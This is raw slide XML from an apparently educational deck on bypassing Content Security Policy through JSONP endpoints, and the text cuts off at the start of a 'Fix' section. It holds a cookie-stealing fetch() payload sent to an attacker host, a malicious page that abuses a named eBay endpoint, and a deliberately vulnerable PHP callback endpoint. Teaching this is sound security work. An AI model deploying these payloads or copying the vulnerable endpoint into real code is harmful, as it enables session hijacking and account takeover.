            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="4764048"/>
            <a:ext cx="7579043" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="4934069"/>
            <a:ext cx="7125414"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highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>fetch('https://attacker.com/steal?cookie='+document.cookie)//({"image":"https://..."})</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1133951" y="6340197"/>
            <a:ext cx="7216259" cy="453509"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3550"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="325F7B"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Success!</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> - Comment operator // ignores JSON response.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="6085046"/>
            <a:ext cx="30480" cy="963811"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>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8788" y="856417"/>
            <a:ext cx="5423654" cy="591979"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 4: Full Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="778788" y="1511618"/>
            <a:ext cx="2841903" cy="355163"/>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Malicious Page:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="778788" y="2104073"/>
            <a:ext cx="13072824" cy="2230160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1274"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="769382" y="2104073"/>
            <a:ext cx="13091636" cy="2230160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1274"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="958810" y="2246114"/>
            <a:ext cx="12712779" cy="1946077"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;!DOCTYPE html&gt;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&lt;html&gt;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&lt;body&gt;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  &lt;h1&gt;Click here for free iPhone!&lt;/h1&gt;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  &lt;script src="https://vi.vipr.ebaystatic.com/v1/picture?callback=fetch('https://attacker.com/steal?cookie='+document.cookie)//"&gt;&lt;/script&gt;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&lt;/body&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="215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&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="778788" y="4571524"/>
            <a:ext cx="2841903" cy="355163"/>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Attack Flow:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="778788" y="5163979"/>
            <a:ext cx="189428" cy="23681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latin typeface="MuseoModerno Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="778788" y="5463064"/>
            <a:ext cx="4252079" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="778788" y="5603438"/>
            <a:ext cx="2963466" cy="295989"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Victim clicks malicious link</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5189101" y="5163979"/>
            <a:ext cx="189428" cy="23681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latin typeface="MuseoModerno Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5189101" y="5463064"/>
            <a:ext cx="4252079" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5189101" y="5603438"/>
            <a:ext cx="4252079" cy="591979"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Script loads from whitelisted eBay domain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9599414" y="5163979"/>
            <a:ext cx="189428" cy="23681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latin typeface="MuseoModerno Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9599414" y="5463064"/>
            <a:ext cx="4252079" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9599414" y="5603438"/>
            <a:ext cx="4252079" cy="591979"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Cookie stolen via fetch() to attacker server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="778788" y="6495693"/>
            <a:ext cx="189428" cy="23681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latin typeface="MuseoModerno Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="778788" y="6794778"/>
            <a:ext cx="6457236" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="778788" y="6935153"/>
            <a:ext cx="4740116" cy="295989"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Attacker uses cookie for session hijacking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7394258" y="6495693"/>
            <a:ext cx="189428" cy="236815"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7394258" y="6794778"/>
            <a:ext cx="6457236" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7394258" y="6935153"/>
            <a:ext cx="3487103" cy="295989"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">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Full account takeover achieved</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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Lab 2: JSONP Endpoint Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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24006" y="1169432"/>
            <a:ext cx="4149923" cy="347186"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Lab 2: JSONP Endpoint Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2524006" y="1550551"/>
            <a:ext cx="2082998" cy="260390"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Setup</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2524006" y="1938457"/>
            <a:ext cx="9582269" cy="178951"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>api.php (Vulnerable JSONP Endpoint):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2524006" y="2213015"/>
            <a:ext cx="9582269" cy="1639729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1270"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2517100" y="2213015"/>
            <a:ext cx="9596080" cy="1639729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1270"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2655927" y="2317075"/>
            <a:ext cx="9318427" cy="1431608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;?php</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header("Content-Security-Policy: script-src 'self' https://api.example.com");</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header("Content-Type: application/json");</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$callback = $_GET['callback'] ?? 'callback';</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 JSONP endpoint (vulnerable)</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$data = array('user' =&gt; 'admin', 'role' =&gt; 'admin');</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echo $callback . '(' . json_encode($data) . ')';</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?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2524006" y="3980259"/>
            <a:ext cx="2082998" cy="260390"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2524006" y="4368165"/>
            <a:ext cx="9582269" cy="357902"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>An attacker can embed a script tag on their page pointing to the vulnerable JSONP endpoint. This executes the JSONP response in the attacker's context, allowing them to steal sensitive data (e.g., user details) despite the Content Security Policy designed to restrict script sources.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2524006" y="4853583"/>
            <a:ext cx="2082998" cy="260390"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Fix</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2524006" y="5241488"/>
            <a:ext cx="9582269" cy="1818680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1145"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2517100" y="5241488"/>
            <a:ext cx="9596080" cy="1818680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1145"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
